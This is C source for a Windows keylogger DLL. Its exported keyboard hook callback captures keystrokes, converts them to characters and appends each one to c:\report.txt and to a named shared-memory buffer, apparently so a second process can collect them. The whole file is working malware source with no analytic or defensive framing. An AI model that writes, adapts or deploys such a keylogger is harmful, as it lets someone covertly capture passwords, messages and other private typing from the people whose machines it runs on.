#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#define SHARED_MEMORY_BUFFER_SIZE 256
#define SHARED_MEMORY_SIZE        sizeof(shared_memory_content_t)

typedef struct {
    unsigned int writer_index;
    unsigned int reader_index;
    char buffer[SHARED_MEMORY_BUFFER_SIZE];
}shared_memory_content_t;

static void write_to_shared_memory(shared_memory_content_t *shared_memory_content, char character);

static void log_key_on_file(char character) {
    FILE* f1 = fopen("c:\\report.txt","a+");
    fwrite(&character,1,1,f1);
    fclose(f1);
}

static void log_key_on_shared_memory(char character) {
    HANDLE handle_shared_memory;
    void *shared_memory;
    char *shared_memory_name = "MySharedMemory";
    unsigned int shared_memory_size = SHARED_MEMORY_SIZE;

    handle_shared_memory = OpenFileMapping(
        FILE_MAP_ALL_ACCESS,   // read/write access
        FALSE,                 // do not inherit the name
        shared_memory_name     // name of mapping object
    );

    if (handle_shared_memory == NULL) return;

    shared_memory = MapViewOfFile(
        handle_shared_memory,               // handle to map object
        FILE_MAP_ALL_ACCESS,   // read/write permission
        0,
        0,
        shared_memory_size
    );

    if (shared_memory == NULL) {
        CloseHandle(shared_memory);
        return;
    }

    write_to_shared_memory((shared_memory_content_t *) shared_memory, character);

    UnmapViewOfFile(shared_memory);
    CloseHandle(handle_shared_memory);
}

static void write_to_shared_memory(shared_memory_content_t *shared_memory_content, char character) {
    shared_memory_content->buffer[shared_memory_content->writer_index++] = character;
    shared_memory_content->writer_index %= SHARED_MEMORY_BUFFER_SIZE;
}

static void logChar(char character) {
    log_key_on_file(character);
    log_key_on_shared_memory(character);
}

LRESULT __declspec(dllexport)__stdcall CALLBACK keyboard_hook_callback(int ncode, WPARAM wparam, LPARAM lparam) {

    if (((DWORD)lparam & 0x40000000) &&(HC_ACTION==ncode)) {
        if ((wparam==VK_SPACE)||(wparam==VK_RETURN)||(wparam>=0x2f ) &&(wparam<=0x100)) {
            if (wparam==VK_RETURN)
                logChar('\n');
            else {
                BYTE ks[256];
                GetKeyboardState(ks);

                WORD w;
                UINT scan=0;
                ToAscii(wparam,scan,ks,&w,0);
                logChar((char) w);
            }
        }
    }

    return CallNextHookEx(NULL, ncode, wparam, lparam);
}